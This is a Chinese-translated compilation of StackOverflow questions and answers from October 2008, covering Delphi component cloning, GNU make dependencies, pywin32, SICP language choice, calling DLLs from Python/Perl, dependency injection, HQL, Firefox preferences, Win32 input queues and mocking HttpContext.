# StackOverflow 问答 000239000-000239999

# delphi - 在运行时复制组件

> ID：239002
> 
> 赞同：13
> 
> 时间：2008-10-27T03:23:51.537
> 
> 标签：delphi, rtti

有没有一种简单的方法可以复制父组件下的所有子组件，包括它们的已发布属性？

例如：

*   面板
    *   标签
    *   编辑
    *   列表视图
    *   TSpecialClassX

当然，最重要的因素是，它应该复制我在 TPanel 上放置的任何新组件，而在正常情况下不修改代码。

我听说过 RTTI，但实际上从未使用过。有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-27T08:18:25.327

在通过父控件循环创建 dup 组件之后， 您可以适当地使用“[在运行时替换可视组件](https://stackoverflow.com/questions/120858/replace-visual-component-at-runtime-in-delphi-win32)”[的答案中的 CLoneProperties 例程。](https://stackoverflow.com/questions/120858/replace-visual-component-at-runtime-in-delphi-win32#122915)

**更新**：一些工作代码....

. 我从您的问题中假设您想要复制 WinControl 中包含的控件（因为 Parent 是 TWinControl）。
. 由于我不知道您是否还想将复制的控件与与原始控件相同的事件处理程序挂钩，因此我为此做了一个选项。
. 您可能希望为重复的控件提供一个适当的有意义的名称。

```
uses
  TypInfo;

procedure CloneProperties(const Source: TControl; const Dest: TControl);
var
  ms: TMemoryStream;
  OldName: string;
begin
  OldName := Source.Name;
  Source.Name := ''; // needed to avoid Name collision
  try
    ms := TMemoryStream.Create;
    try
      ms.WriteComponent(Source);
      ms.Position := 0;
      ms.ReadComponent(Dest);
    finally
      ms.Free;
    end;
  finally
    Source.Name := OldName;
  end;
end;

procedure CloneEvents(Source, Dest: TControl);
var
  I: Integer;
  PropList: TPropList;
begin
  for I := 0 to GetPropList(Source.ClassInfo, [tkMethod], @PropList) - 1 do
    SetMethodProp(Dest, PropList[I], GetMethodProp(Source, PropList[I]));
end;

procedure DuplicateChildren(const ParentSource: TWinControl;
  const WithEvents: Boolean = True);
var
  I: Integer;
  CurrentControl, ClonedControl: TControl;
begin
  for I := ParentSource.ControlCount - 1 downto 0 do
  begin
    CurrentControl := ParentSource.Controls[I];
    ClonedControl := TControlClass(CurrentControl.ClassType).Create(CurrentControl.Owner);
    ClonedControl.Parent := ParentSource;
    CloneProperties(CurrentControl, ClonedControl);
    ClonedControl.Name := CurrentControl.Name + '_';
    if WithEvents then
      CloneEvents(CurrentControl, ClonedControl);
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  DuplicateChildren(Panel1);
end; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-27T05:27:00.023

阅读此页面

[**Delphi 中的运行时类型信息 - 它可以为您做什么吗？**](http://www.blong.com/Conferences/BorConUK98/DelphiRTTI/CB140.htm)

注意[将属性从一个组件复制到另一个部分](http://www.blong.com/Conferences/BorConUK98/DelphiRTTI/CB140.htm#CopyingPropertiesFromAComponentToAnother)

它有一个单元，带有过程的 RTTIUnit，它似乎可以完成您想要的部分工作，但我认为它不会复制任何子组件而无需额外的代码。 *（我认为可以将其粘贴在这里...）*

```
procedure CopyObject(ObjFrom, ObjTo: TObject);    
  var
PropInfos: PPropList;
PropInfo: PPropInfo;
Count, Loop: Integer;
OrdVal: Longint;
StrVal: String;
FloatVal: Extended;  
MethodVal: TMethod;
begin
//{ Iterate thru all published fields and properties of source }
//{ copying them to target }

//{ Find out how many properties we'll be considering }
Count := GetPropList(ObjFrom.ClassInfo, tkAny, nil);
//{ Allocate memory to hold their RTTI data }
GetMem(PropInfos, Count * SizeOf(PPropInfo));
try
//{ Get hold of the property list in our new buffer }
GetPropList(ObjFrom.ClassInfo, tkAny, PropInfos);
//{ Loop through all the selected properties }
for Loop := 0 to Count - 1 do
begin
  PropInfo := GetPropInfo(ObjTo.ClassInfo, PropInfos^[Loop]^.Name);
 // { Check the general type of the property }
  //{ and read/write it in an appropriate way }
  case PropInfos^[Loop]^.PropType^.Kind of
    tkInteger, tkChar, tkEnumeration,
    tkSet, tkClass{$ifdef Win32}, tkWChar{$endif}:
    begin
      OrdVal := GetOrdProp(ObjFrom, PropInfos^[Loop]);
      if Assigned(PropInfo) then
        SetOrdProp(ObjTo, PropInfo, OrdVal);
    end;
    tkFloat:
    begin
      FloatVal := GetFloatProp(ObjFrom, PropInfos^[Loop]);
      if Assigned(PropInfo) then
        SetFloatProp(ObjTo, PropInfo, FloatVal);
    end;
    {$ifndef DelphiLessThan3}
    tkWString,
    {$endif}
    {$ifdef Win32}
    tkLString,
    {$endif}
    tkString:
    begin
      { Avoid copying 'Name' - components must have unique names }
      if UpperCase(PropInfos^[Loop]^.Name) = 'NAME' then
        Continue;
      StrVal := GetStrProp(ObjFrom, PropInfos^[Loop]);
      if Assigned(PropInfo) then
        SetStrProp(ObjTo, PropInfo, StrVal);
    end;
    tkMethod:
    begin
      MethodVal := GetMethodProp(ObjFrom, PropInfos^[Loop]);
      if Assigned(PropInfo) then
        SetMethodProp(ObjTo, PropInfo, MethodVal);
    end
  end
end
finally
  FreeMem(PropInfos, Count * SizeOf(PPropInfo));
end;
end; 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-27T21:12:39.443

您可以将源组件写入流并将其读回目标组件。

```
MemStream := TMemoryStream.Create;
try
  MemStream.WriteComponent(Source);
  MemStream.Position := 0;
  MemStream.ReadComponent(Target);
finally
  MemStream.Free;
end; 
```

但是，您可能会遇到重复组件名称的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T04:07:26.237

在运行时复制现有组件实际上相当容易。困难的部分是将所有已发布的属性复制到新的（复制的）对象中。

抱歉，我的代码示例在 C++Builder 中。VCL 是一样的，只是语言不同。用Delphi翻译应该不会太麻烦：

```
for (i = 0; i < ComponentCount; ++i) {
    TControl *Comp = dynamic_cast<TControl *>(Components[i]);
    if (Comp) {
        if (Comp->ClassNameIs("TLabel")) {
            TLabel *OldLabel = dynamic_cast<TDBEdit *>(Components[i]);
            TLabel *NewLabel = new TLabel(this);  // new label
            // copy properties from old to new
            NewLabel->Top = OldLabel->Top;
            NewLabel->Left = OldLabel->Left;
            NewLabel->Caption = Oldlabel->Caption
            // and so on...
        } else if (Comp->ClassNameIs("TPanel")) {
            // copy a TPanel object
        } 
```

也许有人有更好的方法将旧控件的所有已发布属性复制到新控件。

# dependencies - 需要一个可以处理丢失文件的makefile依赖规则

> ID：239004
> 
> 赞同：4
> 
> 时间：2008-10-27T03:25:23.000
> 
> 标签：dependencies, makefile, gnu-make

我们为我们的系统使用 GNU Make。在我们的 makefile 的末尾，我们有一个名为 Makedepends 的包含，它使用 gcc 上的 -MM 开关生成一堆 .d 文件。然后，我们使用 include $(CXXFILES:.cc=.d) 行为每个 .cc 文件包含 .d 文件。但是当我们删除文件或移动文件时，依赖步骤会中断，我们必须手动删除 .d 文件（即使 make clean 也不起作用，因为依赖项失败）

有没有办法生成这些依赖 .d 文件或包含这些依赖 .d 文件，从而优雅地处理文件删除或重定位？

编辑：例如：我有serial.cc，makefiles生成一个serial.d文件，它依赖于buffer.h，但后来我改变了它，所以我不再需要buffer.h，我删除了buffer.h。下次我运行 make 时，它​​会阻塞，因为它包含仍然使 serial.o 依赖于 buffer.h 的 .d 文件。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T03:50:49.250

[http://make.mad-scientist.net/papers/advanced-auto-dependency-generation](http://make.mad-scientist.net/papers/advanced-auto-dependency-generation)描述了这个确切的问题，以及解决它的几种方法。第一个有点误导，但“高级”基本上是正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T03:43:33.523

两种可能：

首先，您能否在 Makefile 中添加一条规则来运行依赖步骤：

```
.SUFFIXES: .d

%.d::
   makedepend_command_here 
```

如果没有，那么从GNU Make 页面的`Last Resort`部分：`info`

> 例如，在测试 makefile 时，您可能不关心源文件是否包含真实数据，只关心它们是否存在。然后你可以这样做：
> 
> ```
>  %::
>          touch $@ 
> ```
> 
> 使所有需要的源文件（作为先决条件）自动创建。

这会为您创建空`.d`文件吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T13:36:22.713

如果您将[makepp](http://makepp.sourceforge.net/)与 option 一起使用`--rm-stale`，它将注意到不再可构建的文件并将其删除。如果这对您来说是一个正常的用例，您可以将该选项放在`.makepprc`构建树的根目录中，并且将始终使用它。

但是，makepp 当然会自己处理所有这些依赖项检测，因此您不需要弄乱您的 makefile。它甚至比您的方法更好，因为它可以及时生成所需的标头以供编译器拾取，而哪里`gcc -MM`会失败。

*makepp 还有很多。除了做 GNU make 能做的几乎所有事情，还有很多有用的东西，你甚至可以用一些 Perl 编程来扩展你的 makefile。*

# python - 让pywin32在python 2.3解释器中内置的open office 2.4中工作

> ID：239009
> 
> 赞同：0
> 
> 时间：2008-10-27T03:32:24.250
> 
> 标签：python, openoffice.org, pywin32, adodbapi

我需要将数据更新到 mssql 2005 数据库，所以我决定使用 adodbapi，它应该内置在 python 2.1.1 及更高版本的标准安装中。

它需要 pywin32 才能正常工作，并且 open office python 2.3 安装没有内置 pywin32。这个内置的 int python 安装似乎也没有 adodbapi，因为当我导入 adodbapi 时出现错误。

关于如何将 pywin32 和 adodbapi 安装到这个 open office 2.4 python 安装中的任何建议？

谢谢

* * *

哦，是的，我尝试了这些方法。烦人的没有。所以我已经恢复到 jython，这样我就可以访问 Open Office 的转换功能以及体面的数据库访问。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T10:13:39.120

也许安装 pywin32 的最好方法是将它放在

(openofficedir)\program\python-core-2.3.4\lib\site-packages

如果您在下面安装了 python 2.3（安装了 pywin），这很容易

C:\python2.3

将 C:\python2.3\Lib\site-packages\ 移动到您的

(openofficedir)\program\python-core-2.3.4\lib\site-packages

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T03:34:37.257

[http://www.time-travelers.org/shane/howtos/MS-SQL-Express-Python-HOWTO.html](http://www.time-travellers.org/shane/howtos/MS-SQL-Express-Python-HOWTO.html)

使用替代品？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T05:56:42.710

我不知道开放式办公室python。我建议尝试标准的[windows python 安装](http://www.python.org/download/)，然后是[Pywin32](http://sourceforge.net/projects/pywin32/)。或者，有一个安装程序在[activestate](http://www.activestate.com/Products/activepython/feature_list.mhtml)中包含两者。在*pythonwin IDE*中，选择菜单项`tools / COM Makepy utility`。您需要构建的库`makepy`是（或类似版本）：

```
Microsoft ActiveX Data Objects 2.8 Library (2.8)
Microsoft ActiveX Data Objects Recordset 2.8 Library (2.8) 
```

完成后`makepy`，您可以使用该`COM`对象访问`ADODB`：

```
from win32com import client
conn=client.Dispatch('adodb.connection')
conn.Open(connection_string)
resultset,x=e.Execute('select * from mytable')
resultset.MoveFirst()
record_fields=resultset.Fields
(etc.) 
```

# functional-programming - 你会用哪种语言自学SICP？

> ID：239019
> 
> 赞同：33
> 
> 时间：2008-10-27T03:41:28.303
> 
> 标签：functional-programming, lisp, clojure, scheme, sicp

我已经抓住了真正学习函数式编程的错误。所以我的下一个自学项目是学习[计算机程序的结构和解释](http://mitpress.mit.edu/sicp/)。不幸的是，我从来没有学过 Lisp，因为我在大学时不是 CS 专业的。

虽然 SICP 不强调编程工具，但做练习需要选择一种类似 Lisp 的语言来使用。似乎[Scheme](http://plt-scheme.org/)的一些实施将是阻力最小的路径。另一方面，我听说其他人使用过[Common Lisp](http://gigamonkeys.com/book/)和[Clojure](http://clojure.org)。在我看来，Common Lisp 或 Clojure 更有可能用于生产代码，因此对我的简历来说稍微好一些。顺便说一句，我完全明白学习一门语言本身是值得的，但学习一门有助于我的简历的语言仍然是一种好处。我是一个资本家，也是一个关于我的学习的学者。

如果你必须自学 SICP，你会选择哪种语言，为什么？理想情况下，我想使用一种可以在 JVM 上运行的语言。我当然可以使用 REPL 与 bash 和 emacs 一起使用的语言。

补充：你们有没有人尝试过不使用 Scheme 来阅读 SICP？如果是这样，你的经历是怎样的？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2008-10-27T03:53:40.570

使用方案。它是现有的最简单和最容易的语言之一，您将花费很少的时间学习足够的时间来理解 SICP。了解 SICP 后，您将了解这些概念如何适用于任何语言。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2008-10-27T04:08:25.160

使用**DrScheme**。正如其他人所说，Scheme 是一种简单的语言，而 DrScheme 是一个使用它的绝佳环境，其中有很多支持和平庸到好的文档。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-10-27T12:24:22.537

不是直接的答案，但我希望这些信息对通过 SICP 工作的任何人都有用。一定要看看这里的视频：

[http://swiss.csail.mit.edu/classes/6.001/abelson-sussman-lectures/](http://swiss.csail.mit.edu/classes/6.001/abelson-sussman-lectures/)

每集一小时有20集。它们是 Abelson 和 Sussman 于 1986 年为惠普员工提供的。我把它们放在我的 iPod 上，并在通勤时观看它们。迷人。

此外，本书的全文可在[http://mitpress.mit.edu/sicp/上在线获取](http://mitpress.mit.edu/sicp/)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-28T03:00:30.850

As someone who hires people, I'll tell you that having Scheme on a resume is a good thing. Having Scheme, SML, Ocaml or Haskell on your resume suggests you are a very well rounded programmer, and quite a thinker.

That said, if you are trying for functional programming, why not Haskell instead? Scheme is multiparadigm, it can be OO, Funcitonal, Streams based, or anything else under the sun. This makes it awesome to try out new programming styles and paradigms, but if your goal is strictly functional, it can be a problem. (You will end up writing non functional code and not realizing it.)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-10-27T12:07:21.230

我同意你应该只使用 Scheme。但是，如果你真的想使用 Common Lisp 或 Clojure，我会选择后者。Scheme 和 Clojure 都是 Lisp-1，所以书中的代码在两者之间会更加一致（除了尾调用，但如果你了解如何补偿你会没事的）。Common Lisp 是一个 Lisp-2，可能会掩盖 SICP 试图教给你的美妙之处。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-27T04:03:44.250

书中的代码是Scheme，所以无论如何你都必须阅读它——你不妨编写它。你甚至可能喜欢它！

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-10-27T04:59:33.730

要从书中获得真正的价值，您必须使用 Scheme。哪种方案实现取决于您当前的环境：

Windows - Dr Scheme (PLT Scheme) - [http://download.plt-scheme.org/](http://download.plt-scheme.org/) Linux - 如果这是一个远程帐户 - 你可以考虑 MZScheme (PLTScheme) ( [http://download.plt-scheme.org/](http://download.plt-scheme.org/) ) 否则，如果这是 Linux 的本地实例，您将需要使用 Dr Scheme。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-10-27T06:42:33.787

我认为 Clojure 非常适合您想要做的事情。它比 Scheme 更实用，因为数据结构是不可变的，并且在 JVM 上运行时非常有用。但是，请注意，无论如何您最终都会学习 Scheme 以便能够理解书中的代码。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2011-04-23T17:48:09.320

While you could use something other than Scheme, you'd be needlessly adding extra work and possibly cutting yourself off from fully understanding what the book is about. SICP was an introductory programming book. It is a stepping stone to deeper topics in computer science. Getting bogged down in 'translating' from Scheme to CL or Clojure would probably obscure the finer points. That would be a shame, because SICP is truly a gateway to understanding what programming is really about.

Learning Scheme is really straight forward (especially compared to both CL and Clojure) and, in fact, the introductory course as well as the book, assumes the student doesn't know it already. CL and Clojure carry considerable baggage relative to the task at hand.

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-10-27T04:46:47.860

> 我已经抓住了真正学习函数式编程的错误。

**据我**所知，SICP 不仅仅是函数式编程。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-10-27T04:52:08.580

**警告：我没有读过整本书**

由于这些示例依赖于闭包和延续，因此使用具有这两个功能的语言会更好地为您服务，否则您需要自己实现它们。

例如，在 Scheme 中编写元循环评估器利用了 Scheme 提供闭包和延续的事实。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2008-10-27T04:55:40.337

我在看 sicp 时使用了 lua

效果很好

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2008-10-27T12:17:29.167

使用除方案之外的任何东西。

在使用其他东西而不是方案时，您将被鼓励多思考，并避免仅仅重新输入示例的诱惑。这是一件好事。

当然，它必须足够相似，在 lisp-1 的意义上，所以 clojure 和 arc 是不错的选择。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2009-05-08T08:43:31.230

我已经使用计划进行自学。向 SICP 学习的最好方法是虔诚地做所有的练习。

我已经使用[Gnu guile](http://www.gnu.org/software/guile/guile.html)进行计划。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-10-28T03:28:38.127

I worked through (most) of it earlier this year, and used Common Lisp, simply because I didn't have Scheme available (don't ask).

As has already been noted, Scheme is a Lisp-1 language whereas Common Lisp is a Lisp-2\. There are enough differences between the languages to mean that you have think carefully about translating the code in the book, so it forced me to really get to grips with the material.

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-10-27T04:53:31.090

> 我听说其他人使用过 Common Lisp 和 Clojure。

您应该使用最能激励您的任何语言，但 99% 的通过 SICP 工作的人将使用 Scheme。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2011-04-22T22:09:03.020

我认为 Scheme 是自然的选择（因为它是 SICP 的“原生”语言）

然而，由于 SICP 的真正价值来自概念而不是特定语言的机制，我认为在任何类似 Lisp 的语言中尝试它都是一个有价值的学习练习。我亲自尝试了 Clojure 中的一些练习，它们都翻译得很好。

对于那些感兴趣的人，有一个正在进行的项目来创建 SICP 的[Clojure 翻译](http://sicpinclojure.com/)。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-10-27T04:48:14.847

> 但是学习一门对我的简历有帮助的语言仍然是一个好处。

那么，您应该尝试使用 VB6 或 COBOL，因为那里有**很多**计费工作。

# python - 如何从脚本语言调用 DLL？

> ID：239020
> 
> 赞同：9
> 
> 时间：2008-10-27T03:42:07.880
> 
> 标签：python, perl, dll

我有一个第三方产品，一个终端仿真器，它提供了一个可以链接到 C 程序的 DLL，以基本上自动驱动这个产品（发送击键，检测屏幕上的内容等等）。

我想用一种脚本语言来驱动它（我对 Python 很熟悉，而对 Perl 不太熟悉），这样我们就不必在发现问题时编译并将可执行文件发送给我们的客户。

我们还希望客户能够使用我们的作为基线编写他们自己的脚本，并且他们不会接受编写和编译 C 代码的想法。

什么是让 Python/Perl 连接到 Windows DLL 的好方法。我的第一个想法是编写一个服务器程序并让 Python 脚本通过 TCP 与其通信，但必须有一个更简单的解决方案。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-27T03:57:11.843

从 Python 调用 C 库的一种方法是使用[ctypes](https://docs.python.org/library/ctypes.html)：

```
>>> from ctypes import *
>>> windll.user32.MessageBoxA(None, "Hello world", "ctypes", 0); 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-10-27T03:58:05.493

在 Perl 中，[Win32::API](http://search.cpan.org/perldoc?Win32::API)是一种与 DLL 接口的简单方法。如果您可以访问编译器和 windows 头文件，还有[Inline::C 。](http://search.cpan.org/perldoc?Inline::C)

Perl [XSUB](http://search.cpan.org/perldoc?perlxs)也可以在 Perl 和 C 之间创建一个接口。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T04:13:34.103

在 Perl中，至少在某些情况下， [P5NCI也会这样做。](http://search.cpan.org/perldoc/P5NCI)但在我看来，您使用的任何直接管理与 dll 接口的东西都将是用户不友好的，如果您要拥有一个用户（脚本？）友好的包装器，它也可能是一个 XS 模块。

我想我没有看到“编译并发送可执行文件”和“编译并发送脚本”之间的有意义的区别。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-27T04:46:03.320

对于 Python，您可以编译一个链接到 DLL 的扩展，以便在 Python 中您可以像普通模块一样导入它。您可以通过使用 Boost.Python 之类的库或使用诸如 SWIG（也支持 Perl 和其他脚本语言）之类的工具来自动生成包装器来手动执行此操作。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-27T22:56:18.330

Python **Py_InitModule** API 函数允许您从 c/c++ 函数创建模块，然后可以从 Python 调用该模块。

大约需要十几行 c/c++ 代码才能实现，但编写代码非常简单：

[https://python.readthedocs.org/en/v2.7.2/extending/extending.html#the-module-s-method-table-and-initialization-function](https://python.readthedocs.org/en/v2.7.2/extending/extending.html#the-module-s-method-table-and-initialization-function)

我编写的[Zeus](http://www.zeusedit.com)编辑器使用这种方法允许用 Python 编写[Zeus](http://www.zeusedit.com)宏，并且效果很好。

# .net - DI-类型类型的动态参数，其中类型是父对象类型

> ID：239023
> 
> 赞同：3
> 
> 时间：2008-10-27T03:42:32.670
> 
> 标签：.net, configuration, dependency-injection, inversion-of-control, castle-windsor

我有一个依赖项，需要将其注入我的一个类中。这种依赖将是生活方式`Transient`。它又具有 type 的依赖关系`Type`。这个类型应该是原始类的类型。我只是想知道是否有人知道我将如何进行此注册。

参见示例：

```
public interface ICustomer
{
    .....
}

public class Customer : ICustomer
{
    public Customer(IRegister register)
    { .... }
}

public interface IRegister
{
    .....
}

public class Register
{
    public Register(Type partentType)
    { .... }
}

public class TestExample
{
    public static void TestMe()
    {
        //If i was creating all this manually it would look
        //   something like this
        IRegister myRegister = new Register(typeof(Customer));
        ICustomer myCustomer = new Customer(myRegister);
    }
} 
```

现在我知道我可以随时打电话`Container.Resolve`，`Customer`然后`Register`手动注入。但是我需要注入`Register`我的大部分课程，所以这并不是那么可行。因此，我需要一种通过 config 或通过`container.Register`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-11-30T21:42:35.870

我能看到的最简单的解决方案是将其更改为

```
public interface IRegister<TParent> { ... }
public class Register<TParent> : IRegister<TParent>
{
    public Register() { ... }
}

public class Customer : ICustomer
{
    public Customer(IRegister<Customer> register) { .... }
} 
```

并将 IRegister 注册为一个开放的泛型类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T14:12:39.230

寄存器到底是做什么的？客户对象是否曾经在内部使用过寄存器？

我不知道您使用的是哪个 DI 容器，但假设您使用的是 Windsor，您可以使用自定义工具来拦截任何组件的创建，然后在那里与您的寄存器进行交互。这样，您甚至不必让客户类将寄存器作为参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T03:50:19.127

我不完全确定这是您要实现的目标，但是您可能想要重写代码，因此您正在执行以下操作：

```
public interface IRegister{
    RegisterResult MyMethod(object thing);
} 
```

所以你将实例传递到寄存器中，这样你就不需要将类型传递给构造函数，你仍然可以使用你的 DI 容器。我希望这是有道理的...

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-27T03:58:03.993

我想到了这一点，但这意味着父对象需要了解这个小实现怪癖。因此，我将创建一个无法再强制执行的依赖项。你认为这是一个问题吗？

就我要实现的目标而言，Register 需要具有父类的类型才能完成工作。因此，它是强制性的依赖。如果它不是强制性的，我只会有一个我要设置的属性。我知道我可以使用反射，但出于性能原因，我试图避免这种情况。

另一种选择是，在客户构造函数的顶部，我在 Registry 类上设置类型（通过公共属性）。但是，使用 Register 的人需要知道这个实现的怪癖，而不是我可以强制执行的怪癖。

干杯安东尼

# image - 在 Windows C 驱动器中存储 Web 服务器图像

> ID：239025
> 
> 赞同：1
> 
> 时间：2008-10-27T03:43:47.643
> 
> 标签：image, web-applications, root, drive

我正在运行 tomcat，并且我有一些自定义图像，当我存储在我的 C 驱动器上时不会显示它们。如果我将它们移动到 webapp 根目录，它们很好，但我不希望这些图像最终出现在 war 文件中。因为我使用的是 Windows 符号链接，所以不是一个选项。关于如何在不存储在 webapp 根目录中的情况下显示图像的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T04:01:31.833

Web 服务器将需要将图像存储在 Web 文件夹（根目录或虚拟目录）中，以将 URL 解析到本地文件位置。

另一方面，如果您使用 file:// 引用图像，则 Web 服务器不提供文件，操作系统是，并且仅适用于有权访问文件的本地用户。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T05:59:03.580

好吧，您也可以通过您的应用程序管理它们 - 即当您收到图像请求时，您的应用程序从磁盘读取它，设置正确的 Content-type 并输出图像。

不建议这样做。最好把这项工作留给网络服务器。

# hibernate - 我们如何在加载特定父级或另一个映射实体属性时修改 HQL 转换器？

> ID：239045
> 
> 赞同：7
> 
> 时间：2008-10-27T03:59:51.980
> 
> 标签：hibernate, hql, resulttransformer

这是一个重要的补充，特别是在能够编写高效的动态 HQL 查询的同时解决性能问题。

但是，在加载特定父级或另一个映射实体属性的情况下，我们如何修改 HQL 转换器？

以下代码：

```
session.createQuery(
    "select st.stNumber as stNumber, st.stDate as stDate "
    + " from SomeTable st "
    + " where st.someTableId < 1000")
    .setResultTransformer( Transformers.aliasToBean(database.SomeTable.class))
.list(); 
```

工作正常，但如果我只想加载其父母的一些属性怎么办？

例如，假设`SomeTable`有一个父调用`SomedParent`并且我只想访问这个父的字段之一？

```
session.createQuery(
    "select st.stNumber as stNumber, st.stDate as stDate, st.someParent.someParentField as someParentField "
    + " from SomeTable st "
    + " where st.someTableId < 1000")
    .setResultTransformer( Transformers.aliasToBean(database.SomeTable.class))
.list(); 
```

那么有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-12-21T14:46:24.243

你几乎是对的。

首先，您创建`SomeTable`：

```
class SomeTable {
    private Long stNumber;
    private Date stDate;
    private String someParentField;

    //getters and setters
} 
```

你的查询：

```
session.createQuery(
    "select st.stNumber as stNumber, st.stDate as stDate, someParent.someParentField as someParentField "
    + " from SomeTable st "
    + " JOIN st.someParent someParent"
    + " where st.someTableId < 1000")
    .setResultTransformer( Transformers.aliasToBean(SomeTable.class))
.list(); 
```

在这种情况下，您不需要为`SomeTable`该类创建构造函数。

# firefox - 在 Firefox 中使用首选项

> ID：239047
> 
> 赞同：3
> 
> 时间：2008-10-27T04:00:29.917
> 
> 标签：firefox, xul

如何在 Firefox 中访问用户首选项？我有以下代码：

```
var control = document.getElementById(control_id);
if (control) {
    control.setAttribute('color', nsPreferences.copyUnicharPref(prefstr, default_val));
} 
```

但是当我运行它时，我得到以下信息：

```
Error: nsPreferences is not defined
Source file: chrome://backgroundtoggle/content/options.xul
Line: 9 
```

我在浏览 Mozilla 文档时遇到了麻烦。我如何让它做我想要的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T05:17:49.233

看起来您需要`nsUserSettings.js`在`.xul`文件中包含：

```
<script type="application/x-javascript" src="chrome://global/content/nsUserSettings.js" /> 
```

这是`nsUserPreferences`定义的地方。

有关示例文件，请参见[此处。](http://www.koders.com/noncode/fid419BA3E23A00B8481C9B4BE7F33B2E32B36ABF07.aspx)标签应该是第一个子元素，`options.xul`以确保它在您自己的代码之前被加载。`script``prefwindow`

* * *

### 附加信息

[这](http://www.rietta.com/firefox/index.html)看起来像是一个关于如何编写 Firefox 扩展的不错的教程。将 mozilla.org 上的所有相关信息整合到一个地方似乎做得很好，并且当您需要有关所涵盖主题的更多详细信息时，它还包含指向 mozilla.org 的链接。我真希望导航能好一点，但你能做什么？使用左侧的导航窗格，然后单击*教程*开始。您必须使用导航窗格浏览每个部分，因为我在页面上寻找“下一个”和“上一个”链接，所以我花了几秒钟才弄清楚。

# c++ - 线程输入队列是全局的吗？

> ID：239054
> 
> 赞同：1
> 
> 时间：2008-10-27T04:05:35.493
> 
> 标签：c++, c, winapi

在win32中，线程输入队列对所有应用程序都是全局的吗？那么应用程序 A 可以将自己附加到应用程序 B 的线程输入队列吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T14:51:23.973

[AttachThreadInput](http://msdn.microsoft.com/en-us/library/ms681956(VS.85).aspx)实际上会这样做。应用程序 A 中的线程可以将自己附加到应用程序 B 中的线程拥有的消息队列中，前提是这两个进程存在于同一个桌面上并且进程 B 不处于更高的[完整性级别](http://msdn.microsoft.com/en-us/library/bb250462.aspx)。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2008-10-27T04:14:10.780

有一个 API 可以让您将间谍软件的输入队列与用户的银行应用程序合并。这种事情正在逐渐被关闭。

# asp.net - 模拟 HttpContext 不起作用

> ID：239059
> 
> 赞同：10
> 
> 时间：2008-10-27T04:09:36.467
> 
> 标签：asp.net, asp.net-mvc, unit-testing, mocking, rhino-mocks

我正在尝试模拟 HttpContext 以便我可以对控制器的 Request.IsAuthenicated 调用进行单元测试。我正在使用[我在 Scott Hanselman 的](http://www.hanselman.com/blog/ASPNETMVCSessionAtMix08TDDAndMvcMockHelpers.aspx)博客中找到的代码来使用 rhino.mocks 来模拟 HttpContext。所以我有这个单元测试片：

```
PostsController postsController = new PostsController(postDL);
mocks.SetFakeControllerContext(postsController);
Expect.Call(postsController.Request.IsAuthenticated).Return(true); 
```

在我的控制器操作中， `if(Request.IsAuthenticated)....` 当我尝试运行单元测试时，测试失败并抛出空异常，当我尝试调试单元测试时，我看到 HttpContext 从未分配给控制器。有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-27T13:55:46.130

这应该有效：

```
PostsController postsController = new PostsController(postDL);
var context = mocks.Stub<HttpContextBase>();
var request = mocks.Stub<HttpRequestBase>();
SetupResult.For(request.IsAuthenticated).Return(true);
SetupResult.For(context.Request).Return(request);    
postsController.ControllerContext = new ControllerContext(context, new RouteData(), postsController); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T10:04:47.983

这可能对您有用，在类似的情况下为我工作：

[http://haacked.com/archive/2007/06/19/unit-tests-web-code-without-a-web-server-using-httpssimulator.aspx](http://haacked.com/archive/2007/06/19/unit-tests-web-code-without-a-web-server-using-httpsimulator.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-11-11T22:32:20.927

